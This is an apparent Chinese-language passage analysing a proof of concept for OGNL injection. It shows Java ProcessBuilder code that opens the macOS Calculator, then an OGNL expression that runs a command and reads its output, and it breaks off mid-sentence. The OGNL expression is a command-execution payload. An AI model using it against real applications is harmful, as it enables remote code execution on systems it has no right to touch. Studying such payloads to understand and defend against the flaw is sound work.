## POC解析

### POC构造

#### (1) 命令执行
ProcessBuilder基本用法
```
String[] cmd = new String[]{"open","-a","/System/Applications/Calculator.app"};
ProcessBuilder processBuilder = new ProcessBuilder(cmd);
processBuilder.redirectErrorStream(true);
try {
		Process process = processBuilder.start();
		BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
		String line;
		while ((line = br.readLine()) != null) {
				System.out.println(line);
		}
}
```
对应的OGNL表达式
```
#a=new ProcessBuilder(new java.lang.String[]{"cmd"}).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#br=new java.io.BufferedReader(#c),
#e=new char[50000],
#br.read(#e)
```
Runtime对应的
                
